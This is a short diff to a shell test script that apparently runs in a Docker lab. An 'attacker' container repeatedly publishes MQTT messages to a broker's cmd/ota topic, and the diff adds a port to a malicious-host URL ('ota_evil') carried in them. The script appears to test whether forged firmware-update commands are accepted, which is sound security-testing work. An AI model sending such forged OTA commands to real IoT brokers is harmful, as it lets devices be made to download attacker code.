@@ -20,7 +20,7 @@ set +e
 RESULT=$(docker compose exec -T attacker sh -c '
   count=0
   for i in $(seq 1 30); do
-    mosquitto_pub -h mosquitto -p 1883 -t cmd/ota -m "http://ota_evil?attempt=$i" 2>/dev/null \
+    mosquitto_pub -h mosquitto -p 1883 -t cmd/ota -m "http://ota_evil:8080?attempt=$i" 2>/dev/null \
       && count=$((count+1)) || true
   done
   echo $count
